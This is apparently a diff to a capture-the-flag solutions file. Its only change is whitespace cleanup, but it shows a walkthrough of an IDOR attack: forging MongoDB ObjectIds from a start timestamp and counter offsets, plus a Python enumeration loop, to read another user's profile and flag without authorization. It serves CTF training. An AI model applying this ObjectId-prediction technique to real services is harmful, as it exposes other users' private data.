@@ -22,7 +22,7 @@ tricks:
       #     }
       #     ${user._id.toString() == firstUserId ? '<p>' + flag + '</p>' : '-'}
       # }
-      # 
+      #
       # Vulnerability:
       # - No authorization check - anyone can access any user's profile
       # - First user (user0) has flag in profile (line 214)
@@ -35,7 +35,7 @@ tricks:
       GET /starttime
       # Returns: Unix timestamp (e.g., 1765683815)
       # This is when the first user was created
-      # 
+      #
       # Alternative: Get from /info endpoint
       GET /info
       # Shows: appStartTimestamp and ISO date
@@ -47,7 +47,7 @@ tricks:
       POST /register
       Content-Type: application/x-www-form-urlencoded
       username=testuser&password=testpass
-      # 
+      #
       # Response:
       # {
       #   "userId": "693e3270444a7e4c348813db",
@@ -55,7 +55,7 @@ tricks:
       #   "distance": 7,
       #   "maybehint": "You are 7 from your target user"
       # }
-      # 
+      #
       # distance = counter difference between new user and first user
 
   - name: "Step 4: Understand MongoDB ObjectId structure"
@@ -67,7 +67,7 @@ tricks:
       # Bytes 4-6 (chars 8-14): machine identifier (3 bytes)
       # Bytes 7-8 (chars 14-18): process ID (2 bytes)
       # Bytes 9-11 (chars 18-24): counter (3 bytes) - increments for each ObjectId
-      # 
+      #
       # Example: 693e3270444a7e4c348813db
       # - Timestamp: 693e3270 (hex) = Unix timestamp
       # - Machine+PID: 444a7e4c34 (chars 8-18)
@@ -80,13 +80,13 @@ tricks:
       # Extract components from new user's ObjectId:
       new_counter = int(new_user_id[18:24], 16)  # Last 6 hex chars
       first_counter = new_counter - distance
-      # 
+      #
       # Construct first user's ObjectId:
       timestamp_hex = format(start_timestamp, '08x')  # 8 hex chars
       machine_pid = new_user_id[8:18]  # machine + pid (same for all users)
       counter_hex = format(first_counter, '06x')  # 6 hex chars
       first_user_id = timestamp_hex + machine_pid + counter_hex
-      # 
+      #
       # Example:
       # start_timestamp = 1765683815
       # new_user_id = "693e3270444a7e4c348813db"
@@ -100,11 +100,11 @@ tricks:
     how: "Access /profile/:id with first user's ObjectId"
     payload: |
       GET /profile/{first_user_id}
-      # 
+      #
       # Response contains flag if user._id == firstUserId:
       # <h1>Welcome, user0</h1>
       # <p>FLAG{...}</p>
-      # 
+      #
       # No authentication required - IDOR vulnerability
 
   - name: "Alternative: Enumerate ObjectIds"
@@ -118,4 +118,3 @@ tricks:
           resp = requests.get(f"/profile/{test_id}")
           if "FLAG" in resp.text:
               flag = extract_flag(resp.text)
-
